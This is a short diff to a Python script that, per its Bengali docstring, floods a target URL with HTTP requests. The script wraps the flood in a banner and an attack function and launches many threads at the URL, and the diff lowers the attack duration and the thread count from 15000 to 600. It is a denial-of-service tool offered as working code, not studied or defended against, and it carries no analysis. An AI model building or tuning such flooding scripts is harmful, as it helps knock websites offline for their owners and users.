@@ -24,7 +24,7 @@ def banner():
         ╚════════════════════════════╝{RESET}
     """)
 
-def attack(url, duration=15000):
+def attack(url, duration=600):
     """URL-এ HTTP রিকোয়েস্ট ফ্লাড করা"""
     end_time = time.time() + duration
     request_count = 0
@@ -47,7 +47,7 @@ def start_attack(url):
     
     # 5টি থ্রেড দিয়ে আক্রমণ শুরু
     threads = []
-    for _ in range(15000):
+    for _ in range(600):
         thread = threading.Thread(target=attack, args=(url,))
         threads.append(thread)
         thread.start()
